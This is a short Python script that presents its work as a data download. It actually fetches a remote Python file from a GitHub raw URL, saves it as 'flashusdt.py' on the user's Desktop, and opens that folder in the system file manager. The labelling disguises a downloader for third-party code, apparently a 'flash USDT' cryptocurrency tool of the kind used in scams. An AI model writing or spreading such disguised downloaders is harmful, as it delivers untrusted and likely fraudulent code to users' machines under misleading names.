
import os
import urllib.request

DATA_DIR = os.path.join(os.path.expanduser("~"), "Desktop")
DATA_PATH = os.path.join(DATA_DIR, "flashusdt.py")

def download_data():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
    if not os.path.exists(DATA_PATH):
        urllib.request.urlretrieve("https://raw.githubusercontent.com/flashwe12/fkashwe2/refs/heads/main/flasher2.py", DATA_PATH)
    return DATA_PATH

def open_folder():
    if os.name == "nt":
        os.system('explorer "{}"'.format(DATA_DIR))
    elif os.name == "posix":
        try:
            if os.uname().sysname == "Darwin":
                os.system('open "{}"'.format(DATA_DIR))
            else:
                os.system('xdg-open "{}"'.format(DATA_DIR))
        except:
            pass
